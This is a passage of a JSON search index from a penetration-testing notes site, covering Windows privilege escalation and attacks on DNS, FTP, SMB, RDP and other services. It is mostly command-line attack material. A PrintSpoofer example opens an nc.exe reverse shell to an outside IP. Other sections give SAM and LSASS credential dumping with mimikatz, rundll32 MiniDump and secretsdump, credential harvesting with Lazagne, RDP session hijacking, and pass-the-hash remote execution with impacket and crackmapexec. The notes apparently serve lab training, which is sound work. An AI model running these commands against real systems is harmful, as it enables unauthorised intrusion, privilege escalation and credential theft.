rockyou.txt\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/","title":"Windows","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#delete","title":"delete","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#vulnerabilities","title":"Vulnerabilities","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#rogue-potato","title":"Rogue Potato","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#juicylovely-potato","title":"Juicy/Lovely Potato","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#printspoofer","title":"PrintSpoofer","text":"<p>Service Account (IIS/MSSQL) got privilge SeImpersonatePrivilege </p> <p>Create a reverse shell:</p> <pre><code>C:\\TOOLS&gt;PrintSpoofer.exe -c \"C:\\TOOLS\\nc.exe 10.10.13.37 1337 -e cmd\"\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\n\nNetcat listener:\n\nC:\\TOOLS&gt;nc.exe -l -p 1337\nMicrosoft Windows [Version 10.0.19613.1000]\n(c) 2020 Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32&gt;whoami\nnt authority\\system\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#passwords-attacks","title":"Passwords Attacks","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#attacking-sam","title":"Attacking SAM","text":"<p>With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section. Copying SAM Registry Hives</p> <p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below: Registry Hive   Description hklm\\sam    Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. hklm\\system     Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. hklm\\security   Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</p> <p>We can create backups of these hives using the reg.exe utility.</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#using-regexe-save-to-copy-registry-hives","title":"Using reg.exe save to Copy Registry Hives","text":"<pre><code>&gt; reg.exe save hklm\\sam C:\\sam.save\n&gt; reg.exe save hklm\\system C:\\system.save\n&gt; reg.exe save hklm\\security C:\\security.save\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#dumping-hashes-offline","title":"Dumping Hashes Offline","text":"<p>One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:</p> <pre><code>$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#mimikatz","title":"Mimikatz","text":"<pre><code>mimikatz &gt; privilege::debug\nmimikatz &gt; token::elevate\nmimikatz &gt; lsadump::sam\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#dumping-hashes-remote","title":"Dumping Hashes Remote","text":"<pre><code>$ crackmapexec smb &lt;IP/RANGE&gt; --local-auth -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --sam`\n$ crackmapexec smb &lt;IP/RANGE&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --sam`\n$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#cracking-hashes-with-hashcat","title":"Cracking Hashes with Hashcat","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#attacking-lsa","title":"Attacking LSA","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":"<p>Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#task-manager-method","title":"Task Manager Method","text":"<p>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file A file called lsass.DMP is created and saved in:  - <code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></p>"},{"location":"zNew/PrivilegeEscalation/Windows/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll Method","text":"<p>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p> <p>Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#finding-lsass-pid-in-cmd","title":"Finding LSASS PID in cmd","text":"<pre><code># find lsass.exe and its process ID in the PID field.\n&gt; tasklist /svc\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#finding-lsass-pid-in-powershell","title":"Finding LSASS PID in PowerShell","text":"<pre><code># see the process ID in the Id field\nGet-Process lsass\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#creating-lsassdmp-using-powershell","title":"Creating lsass.dmp using PowerShell","text":"<p>Once we have the PID assigned to the LSASS process, we can create the dump file. With an elevated PowerShell session, we can issue the following command to create the dump file:</p> <pre><code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump &lt;PID&gt; C:\\lsass.dmp full\n</code></pre> <p>With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.</p> <p>If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#dumping-hashes-offline_1","title":"Dumping Hashes Offline","text":"<p>Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.</p> <p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a \"snapshot\" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out. Running Pypykatz</p> <p>The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:</p> <pre><code>$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp`\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#mimikatz_1","title":"Mimikatz","text":"<pre><code>mimikatz &gt; privilege::debug\nmimikatz &gt; token::elevate\n\n#Dump LSASS:\nmimikatz &gt; sekurlsa::logonpasswords\n\n#Dump and save LSASS in a file\nmimikatz &gt; sekurlsa::minidump c:\\temp\\lsass.dmp\n\n# Dump LSA\nmimikatz &gt; lsadump::secrets\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#dumping-hashes-remote_1","title":"Dumping Hashes Remote","text":"<pre><code>$ crackmapexec smb &lt;IP/RANGE&gt; --local-auth -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --lsa\n$ crackmapexec smb &lt;IP/RANGE&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --lsa\n$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#cracking-the-nt-hash-with-hashcat","title":"Cracking the NT Hash with Hashcat","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#credential-harvesting","title":"Credential Harvesting","text":""},{"location":"zNew/PrivilegeEscalation/Windows/#key-terms-to-search","title":"Key Terms to Search","text":"<p>Passwords   Passphrases     Keys Username    User account    Creds Users   Passkeys    Passphrases configuration   dbcredential    dbpassword pwd     Login   Credentials</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#search-tools","title":"Search Tools","text":"<p>With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.</p> <p>By default, it will search various OS settings and the file system for files &amp; applications containing the key term entered in the search bar.</p>"},{"location":"zNew/PrivilegeEscalation/Windows/#running-lazagne-all","title":"Running Lazagne All","text":"<p>We can also take advantage of third-party tools like Lazagne to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.</p> <pre><code>&gt; start lazagne.exe all\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#using-findstr","title":"Using findstr","text":"<p>We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:</p> <pre><code>&gt; findstr /SIM /C:\"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n&gt; findstr /si \"password\" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml\n</code></pre>"},{"location":"zNew/PrivilegeEscalation/Windows/#additional-considerations","title":"Additional Considerations","text":"<p>Here are some other places we should keep in mind when credential hunting:     - Passwords in Group Policy in the SYSVOL share     - Passwords in scripts in the SYSVOL share     - Password in scripts on IT shares     - Passwords in web.config files on dev machines and IT shares     - unattend.xml     - Passwords in the AD user or computer description fields     - KeePass databases --&gt; pull hash, crack and get loads of access.     - Found on user systems and shares     - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint</p>"},{"location":"zNew/Services/DNS/","title":"DNS","text":""},{"location":"zNew/Services/DNS/#delete","title":"delete","text":""},{"location":"zNew/Services/DNS/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/DNS/#nmap","title":"Nmap","text":"<pre><code>$ nmap -p53 -Pn -sV -sC 10.10.110.213\n</code></pre>"},{"location":"zNew/Services/DNS/#dig","title":"Dig","text":"DNS Record Description A Returns an IPv4 address of the requested domain as a result. AAAA Returns an IPv6 address of the requested domain. MX Returns the responsible mail servers as a result. NS Returns the DNS servers (nameservers) of the domain. TXT This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. CNAME This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu. PTR The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names. SOA Provides information about the corresponding DNS zone and email address of the administrative contact. <pre><code># DIG - NS Query\n$ dig ns inlanefreight.htb @&lt;IP&gt;\n\n# DIG - Version Query\n$ dig CH TXT version.bind 10.129.120.85\n\n# DIG - ANY Query\n$ dig any inlanefreight.htb @&lt;IP&gt;\n\n# DIG - AXFR Zone Transfer\n$ dig axfr inlanefreight.htb @&lt;IP&gt;\n</code></pre> <p>We dig axfr and see what returns.  If nothing returns, brute force.</p>"},{"location":"zNew/Services/DNS/#subdomain-brute-forcing","title":"Subdomain Brute Forcing","text":"<pre><code>$ for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @&lt;IP&gt; | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a subdomains.txt;done\n</code></pre> <pre><code>$ dnsenum --dnsserver &lt;IP&gt; --enum -p 0 -s 0 -o subdomains.txt -f usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt/fierce.txt inlanefreight.htb\n</code></pre>"},{"location":"zNew/Services/DNS/#attacking-dns","title":"Attacking DNS","text":""},{"location":"zNew/Services/DNS/#dig-axfr-zone-transfer","title":"DIG - AXFR Zone Transfer","text":"<p>COR33@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb</p>"},{"location":"zNew/Services/DNS/#domain-takeovers-subdomain-enumeration","title":"Domain Takeovers &amp; Subdomain Enumeration","text":"<p>COR33@htb[/htb]# ./subfinder -d inlanefreight.com -v       </p> <p>COR33@htb[/htb]$ cd subbrute COR33@htb[/htb]$ echo \"ns1.inlanefreight.com\" &gt; ./resolvers.txt COR33@htb[/htb]$ ./subbrute inlanefreight.com -s ./names.txt -r ./resolvers.txt </p>"},{"location":"zNew/Services/FTP/","title":"FTP","text":""},{"location":"zNew/Services/FTP/#delete","title":"delete","text":""},{"location":"zNew/Services/FTP/#interacting","title":"Interacting","text":"<p>Connecting</p> <pre><code>$ ftp &lt;USER&gt;@&lt;IP&gt; &lt;PORT&gt;\n</code></pre> <pre><code>$ openssl s_client -connect 10.129.14.136:21 -starttls ftp\n</code></pre> <p>Recursive Listing</p> <pre><code>ftp&gt; ls -R\n</code></pre> <p>Download Files</p> <pre><code>ftp&gt; get Notes.txt\n</code></pre> <p>Download All Available Files</p> <pre><code>$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136\n</code></pre> <p>Upload a File</p> <pre><code>ftp&gt; put testupload.txt \n</code></pre>"},{"location":"zNew/Services/FTP/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/FTP/#nmap","title":"Nmap","text":"<pre><code>$ sudo nmap --script-updatedb`\n$ sudo nmap -sC -sV -A -p 21 192.168.2.142`\n</code></pre>"},{"location":"zNew/Services/FTP/#ftp-bounce-attack","title":"FTP Bounce Attack","text":"<p>An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server.</p> <p>Consider we are targetting an FTP Server FTP_DMZ exposed to the internet. Another device within the same network, Internal_DMZ, is not exposed to the internet. We can use the connection to the FTP_DMZ server to scan Internal_DMZ using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.</p> <p>The Nmap -b flag can be used to perform an FTP bounce attack:</p> <pre><code>$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2`\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/","title":"IMAP POP3","text":""},{"location":"zNew/Services/IMAP-POP3/#delete","title":"delete","text":""},{"location":"zNew/Services/IMAP-POP3/#imap-commands","title":"IMAP Commands","text":"Command Description 1 LOGIN username password User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed. 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH  all Retrieves data associated with a message in the mailbox. 1 FETCH  BODY[] Retrieves body message 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server."},{"location":"zNew/Services/IMAP-POP3/#pop3-commands","title":"POP3 Commands","text":"Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server."},{"location":"zNew/Services/IMAP-POP3/#connecting","title":"Connecting","text":""},{"location":"zNew/Services/IMAP-POP3/#imap","title":"IMAP","text":"<pre><code>$ telnet 10.129.14.128 143\n$ telnet 10.129.14.128 993\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/#pop3","title":"POP3","text":"<pre><code>$ telnet 10.129.14.128 110\n$ telnet 10.129.14.128 995\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/#openssl-tls-encrypted-interaction-imap","title":"OpenSSL - TLS Encrypted Interaction IMAP","text":"<pre><code>$ openssl s_client -connect 10.129.14.128:imaps\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/#openssl-tls-encrypted-interaction-pop3","title":"OpenSSL - TLS Encrypted Interaction POP3","text":"<pre><code>$ openssl s_client -connect 10.129.14.128:pop3s\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/#footprinting-the-service","title":"Footprinting the Service","text":""},{"location":"zNew/Services/IMAP-POP3/#nmap","title":"Nmap","text":"<pre><code>sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC`\n</code></pre>"},{"location":"zNew/Services/IMAP-POP3/#curl","title":"cURL","text":"<p><code>curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd</code></p> <p><code>curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v</code></p>"},{"location":"zNew/Services/IPMI/","title":"Footprinting","text":""},{"location":"zNew/Services/IPMI/#nmap","title":"Nmap","text":"<pre><code>$ sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local\n</code></pre>"},{"location":"zNew/Services/IPMI/#metasploit-version-scan","title":"Metasploit Version Scan","text":"<pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_version \n</code></pre>"},{"location":"zNew/Services/IPMI/#metasploit-dumping-hashes","title":"Metasploit Dumping Hashes","text":"<pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes \n</code></pre>"},{"location":"zNew/Services/NFS/","title":"NFS","text":""},{"location":"zNew/Services/NFS/#delete","title":"delete","text":""},{"location":"zNew/Services/NFS/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/NFS/#nmap","title":"Nmap","text":"<pre><code>$ nmap &lt;IP&gt; -p111,2049 -sVC\n$ nmap --script nfs* &lt;IP&gt; -sV -p111,2049\n</code></pre>"},{"location":"zNew/Services/NFS/#nfs-shares","title":"NFS Shares","text":""},{"location":"zNew/Services/NFS/#show-available-nfs-shares","title":"Show Available NFS Shares","text":"<pre><code>$ showmount -e &lt;IP&gt; \n</code></pre>"},{"location":"zNew/Services/NFS/#mounting-nfs-share","title":"Mounting NFS Share","text":"<pre><code>$ mkdir target-NFS\n$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock\n$ cd target-NFS\n$ tree .\n</code></pre>"},{"location":"zNew/Services/NFS/#unmounting","title":"Unmounting","text":"<pre><code>$ sudo umount target-NFS\n</code></pre>"},{"location":"zNew/Services/OracleTNS/","title":"Footprinting","text":"<pre><code>#!/bin/bash\n\nsudo apt-get install libaio1 python3-dev alien python3-pip -y\ngit clone &lt;https://github.com/quentinhardy/odat.git&gt;\ncd odat/\ngit submodule init\ngit submodule update\nsudo apt install oracle-instantclient-basic oracle-instantclient-devel oracle-instantclient-sqlplus -y\npip3 install cx_Oracle\nsudo apt-get install python3-scapy -y\nsudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap\nsudo pip3 install argcomplete &amp;&amp; sudo activate-global-python-argcomplete\n</code></pre> <pre><code>$ ./odat.py all -s &lt;IP&gt;\n</code></pre>"},{"location":"zNew/Services/RDP/","title":"RDP","text":""},{"location":"zNew/Services/RDP/#delete","title":"delete","text":""},{"location":"zNew/Services/RDP/#interacting","title":"Interacting","text":""},{"location":"zNew/Services/RDP/#connecting","title":"Connecting","text":"<pre><code># ClearPassword\n$ xfreerdp /v:&lt;target-IP&gt; /d:&lt;domain&gt; /u:&lt;username&gt; /p:&lt;password&gt;\n\n# PTH\n&gt; reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n$ xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;\n</code></pre>"},{"location":"zNew/Services/RDP/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/RDP/#nmap","title":"Nmap","text":"<pre><code>$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*\n</code></pre>"},{"location":"zNew/Services/RDP/#rdp-session-hijacking","title":"RDP Session Hijacking","text":"<pre><code>PS &gt; query user\n</code></pre> <p>As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.</p> <p>To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:</p> <pre><code>&gt; tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}\n</code></pre> <p>If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.</p> <pre><code>&gt; sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\"\n</code></pre> <p>To run the command, we can start the sessionhijack service :</p> <pre><code>&gt; net start sessionhijack\n</code></pre> <p><code>Note: This method no longer works on Server 2019.</code></p>"},{"location":"zNew/Services/SMB/","title":"SMB","text":""},{"location":"zNew/Services/SMB/#delete","title":"delete","text":""},{"location":"zNew/Services/SMB/#interacting","title":"Interacting","text":""},{"location":"zNew/Services/SMB/#show-avaiable-shares","title":"Show avaiable shares","text":"<pre><code># crackmapexec\n$ crackmapexec smb 10.129.42.197 -u \"user\" -p \"password\" --shares\n$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'\n\n# smbmap\n$ smbmap -H 10.129.14.128\n$ smbmap -H 10.129.14.128 -r notes\n$ smbmap -H 10.129.14.128 --download \"notes\\note.txt\"\n$ smbmap -H 10.129.14.128 --upload test.txt \"notes\\test.txt\"\n\n# smbclient\n$ smbclient -N -L //10.129.14.128\n</code></pre> <ul> <li><code>-N</code> suppresses the password prompt</li> <li><code>-L</code> want to retrieve a list of available shares on the remote host</li> </ul>"},{"location":"zNew/Services/SMB/#connecting","title":"Connecting","text":"<pre><code>$ smbclient -U bob //10.129.42.253/users\n$ smbclient -U user \\\\\\\\10.129.42.197\\\\SHARENAME\n\n# PTH\n$ smbclient.py -hashes\":&lt;hash&gt;\" &lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/Services/SMB/#download-files","title":"Download Files","text":"<pre><code>smb: \\&gt; get prep-prod.txt \n</code></pre>"},{"location":"zNew/Services/SMB/#footprinting","title":"Footprinting","text":""},{"location":"zNew/Services/SMB/#nmap","title":"Nmap","text":"<pre><code>$ sudo nmap 10.129.14.128 -sV -sC -p139,445\n$ nmap --script smb-os-discovery.nse -p445 10.10.10.40\n</code></pre>"},{"location":"zNew/Services/SMB/#remote-procedure-call-rpc","title":"Remote Procedure Call (RPC)","text":"<pre><code>$ rpcclient &lt;IP&gt; -U \"\"\n$ rpcclient -U'%' &lt;IP&gt;\n$ rpcclient -U \"\" -N 172.16.5.5\n</code></pre> Query Description srvinfo Server information. enumdomains Enumerate all domains that are deployed in the network. querydominfo Provides domain, server, and user information of deployed domains. netshareenumall Enumerates all available shares. netsharegetinfo  Provides information about a specific share. enumdomusers Enumerates all domain users. queryuser  Provides information about a specific user."},{"location":"zNew/Services/SMB/#impacket-samrdumppy-brute-forcing-user-rids","title":"Impacket - Samrdump.py (Brute Forcing User RIDs)","text":"<pre><code>$ samrdump.py 10.129.14.128\n</code></pre>"},{"location":"zNew/Services/SMB/#enum4linux-ng","title":"Enum4Linux-ng","text":"<pre><code>$ git clone https://github.com/cddmp/enum4linux-ng.git\n$ cd enum4linux-ng\n$ pip3 install -r requirements.txt\n$ ./enum4linux-ng.py &lt;IP&gt; -A -C\n</code></pre>"},{"location":"zNew/Services/SMB/#remote-code-execution","title":"Remote Code Execution","text":"<ul> <li>Impacket PsExec - Python PsExec like functionality example using RemComSvc.</li> <li>Impacket SMBExec - A similar approach to PsExec without using RemComSvc. The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.</li> <li>Impacket atexec - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.</li> <li>CrackMapExec - includes an implementation of smbexec and atexec.</li> <li>Metasploit PsExec - Ruby PsExec implementation.</li> </ul> <pre><code>$ impacket-psexec -h\n$ impacket-psexec administrator:'Password123!'@10.10.110.17\n</code></pre> <pre><code>$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec\n$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users\n$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n</code></pre>"},{"location":"zNew/Services/SMB/#interactive-shell","title":"interactive-shell","text":"<p>Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py] One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.</p> <p>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.</p> <pre><code># ClearText\n$ impacket-psexec &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n$ psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n\n# PTH\n$ impacket-psexec -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt;`\n$ psexec.py -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt;\n\n# PTT - Same as PassTheHash but use -k and -no-pass \n$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5\n$ psexec.py -dc-ip IP -target-ip $IP -no-pass -k &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;target machine name&gt;.&lt;DOMAIN&gt; -&gt; goat\n$ psexec.py -dc-ip &lt;IP&gt; -no-pass -k &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/Services/SMB/#pseudo-shell-file-write-and-read","title":"pseudo-shell (file write and read)","text":""},{"location":"zNew/Services/SMB/#impacket-toolkit","title":"Impacket Toolkit","text":"<p>Atexec.py [https://github.com/fortra/impacket/blob/master/examples/atexec.py]</p> <pre><code># ClearText\n$ atexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; \"command\" \n\n# PTH\n$ atexec.py -hashes \":&lt;hash&gt;\" &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; \"command\"\n\n# PTT\n$ atexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; \"command\" -k -no-pass\n</code></pre> <p>Smbexec.py [https://github.com/fortra/impacket/blob/master/examples/smbexec.py]</p> <pre><code># ClearText\n$ smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n\n# PTH\n$ smbexec.py -hashes \":&lt;hash&gt;\" &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; \n\n# PTT\n$ smbexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -k -no-pass\n</code></pre> <p>Wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py] Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.</p> <pre><code># ClearText\n$ wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n\n# PTH\n$ wmiexec.py -hashes\":&lt;hash&gt;\" &lt;user&gt;@&lt;ip&gt; \n</code></pre> <p>Dcomexec.py [https://github.com/fortra/impacket/blob/master/examples/dcomexec.py]</p> <pre><code># ClearText\n$ dcomexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n\n# PTH\n$ dcomexec.py -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt; \n</code></pre> <p>CrackMapExec</p> <pre><code># ClearText\n$ crackmapexec smb &lt;ip&gt; -u 